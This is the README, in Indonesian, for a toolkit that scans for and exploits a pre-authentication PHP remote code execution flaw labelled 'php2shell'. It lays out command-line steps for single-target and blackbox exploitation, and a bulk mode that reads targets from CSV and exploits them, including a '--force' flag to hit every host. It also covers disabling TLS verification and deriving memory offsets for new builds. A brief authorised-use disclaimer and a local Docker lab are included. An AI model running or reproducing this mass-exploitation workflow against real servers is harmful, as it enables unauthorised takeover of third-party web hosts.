# php2shell — toolkit RCE (CVE-2026-109618 / CVE-2026-109619)

Toolkit lengkap untuk mendeteksi dan mengeksploitasi **php2shell** — RCE *pre-auth*
via Use-After-Free (OOM di `session.upload_progress`).

> ⚠️ **Hanya untuk target yang kamu miliki atau punya izin tertulis untuk di-test.**
> Ini RCE kritis pre-auth. Jangan dipakai sembarangan.

**Terkena:** PHP 5.4.0 – 8.5.11 (semua web SAPI; risiko tertinggi di mod_php).
**Sudah di-patch:** PHP 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35 (2026-10-21).

---

## 1. Install

```bash
cd php2shell-poc
python3 -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt
```

Butuh Python 3.9+.

## 2. Isi repo

| File | Fungsi |
|---|---|
| `scanner.py` | **Deteksi** — cek 1 atau banyak target apakah vuln (tanpa exploit). |
| `exploit.py` | **RCE** — full chain (infoleak → heap spray → `system()`). |
| `bulk.py` | **Scan + exploit banyak target sekaligus** dari CSV/list/JSON. |
| `derive_offsets.py` | Tambah offset build baru ke `offsets.json`. |
| `offsets.json` | Database offset per build (default: `php:8.4.26-apache` amd64). |
| `lab/` | Target lab yang sengaja vulnerable (Docker). |

---

## 3. Use case — SCAN (deteksi, tidak exploit)

### Satu URL

```bash
python3 scanner.py -u https://target.com/index.php -v
```

### Banyak target (file list / CSV / JSON)

```bash
python3 scanner.py -l targets.txt -t 20 -o hasil.json
python3 scanner.py -l targets.example.csv -t 20 -o hasil.json --all-results
```

`-l` menerima 3 format otomatis:
- **list biasa** — satu URL per baris.
- **CSV** — baris header dengan kolom `url` (kolom lain diabaikan).
- **JSON array** — `["https://a.com", "https://b.com"]`.

Flag penting scanner:

```bash
-k                 # matikan verifikasi TLS (sering perlu, lihat §7)
--sapi mod_php     # cari target yang benar-benar bisa di-exploit (mod_php)
--sapi fpm         # deteksi crash di PHP-FPM
--all-results      # simpan semua hasil, bukan cuma yang vuln
```

---

## 4. Use case — EXPLOIT (RCE)

### Target lab (latihan lokal)

```bash
cd lab
docker compose up -d --build      # listen di 127.0.0.1:8088
```

Lalu dari repo root:

```bash
# Oracle via file: command menulis ke webroot, kita baca balik
python3 exploit.py --url http://127.0.0.1:8088/index.php \
    --cmd 'id>/var/www/html/pwn.txt' --fetch /pwn.txt

# Oracle blind timing: command `sleep 5`, tanpa perlu nulis file
python3 exploit.py --url http://127.0.0.1:8088/index.php --sleep-oracle
```

### Target blackbox (tanpa data apa pun) — `--auto`

```bash
python3 exploit.py --url https://target.com/index.php --auto \
    --cmd 'id>/var/www/html/pwn.txt' --fetch /pwn.txt
```

`--auto` = fingerprint versi PHP dari header → cari offset di `offsets.json` →
jalankan chain. Kalau build-nya belum ada di DB, tool akan kasih tahu persis cara
menambahkannya (lihat §6).

```bash
python3 exploit.py --url https://target.com/index.php --auto --sleep-oracle
```

---

## 5. Use case — BULK (scan + exploit banyak sekaligus)

Satu file CSV, langsung scan semua, lalu exploit yang vuln:

```bash
python3 bulk.py targets.csv
```

CSV minimal (cukup kolom `url`):

```csv
url
https://a.com/index.php
https://b.com/index.php
```

CSV lengkap (opsi per-target):

```csv
url,cmd,fetch,sapi,insecure,label
https://a.com/index.php,id,/pwn.txt,mod_php,true,site-a
https://b.com/index.php,id,/pwn.txt,auto,,site-b
```

Flag `bulk.py`:

```bash
--scan-only          # deteksi saja, tanpa exploit
--exploit-only       # langsung exploit semua target (skip scan)
--force              # exploit semua target, bukan cuma yang VULNERABLE
-t 20                # thread scan (default 10)
-k                   # matikan verifikasi TLS
--out-dir hasil/     # lokasi output CSV
```

Output: `bulk_scan.csv` (hasil deteksi) dan `bulk_exploit.csv` (hasil RCE).

> ⚠️ Scanner bisa menandai host PHP-FPM sebagai VULNERABLE (worker-nya crash),
> tapi `exploit.py` **hanya bisa** di mod_php/lsphp. Pakai `--sapi mod_php` untuk
> menemukan target yang benar-benar bisa di-exploit.

---

## 6. Use case — tambah offset build baru

Saat kamu punya `libphp.so` dari target (versi + distro + SAPI sama):

```bash
python3 derive_offsets.py /path/libphp.so --append-db \
    --php-version 8.4.26 --distro debian --arch amd64 --sapi apache \
    --dtor 0x65eb60 --libc /path/libc.so.6
```

Atau langsung dari image Docker resmi:

```bash
python3 derive_offsets.py --docker php:8.4.26-apache --append-db \
    --php-version 8.4.26 --distro debian --arch amd64 --sapi apache --dtor 0x65eb60
```

Setelah itu `--auto` langsung jalan untuk build tersebut.

---

## 7. Error certificate (TLS) — kenapa muncul & cara fix

Sering muncul begini:

```
TLS certificate verification failed for target.com ...
```

Ini **bukan bug script**. Target pentest sering pakai sertifikat self-signed,
CDN (Cloudflare), atau hostname yang tidak cocok. Solusinya matikan verifikasi:

```bash
# exploit.py
python3 exploit.py --url https://target.com/index.php --auto --no-verify ...

# scanner.py
python3 scanner.py -u https://target.com -k

# bulk.py
python3 bulk.py targets.csv -k
```

Kalau malah muncul:

```
TLS handshake failed with host:443 — is that port actually speaking TLS?
```

artinya **skema URL salah**: port itu HTTP biasa, bukan HTTPS. Ubah `https://` jadi
`http://` (atau cek port-nya). `exploit.py` sudah membedakan dua error ini dan
memberi hint yang tepat.

---

## 8. Kapan exploit TIDAK jalan (penting)

- **PHP-FPM / nginx** — worker di-respawn setelah OOM, jadi chain ini tidak
  mendarat. Scanner tetap bisa menandainya vuln (crash), tapi `exploit.py` tidak
  bisa. Ini yang membedakan "vulnerable" vs "exploitable".
- **`session.upload_progress.enabled = Off`** — fitur pemicunya mati.
- **Banyak prefork worker** — heap grooming tidak stabil.
- **Offset build belum ada** di `offsets.json` — tambahkan dulu (§6).

---

## 9. Atribusi

Reproduksi terstruktur dari public reference chain **78ResearchLab**
(`PHP2Shell-Full-Chain-Exploit`). Penemuan vuln oleh tim **Calif**; info
operasional dari **NCSC-NL** dan **CERT-EU**. Scanner berdasarkan detektor publik
Assetnote.
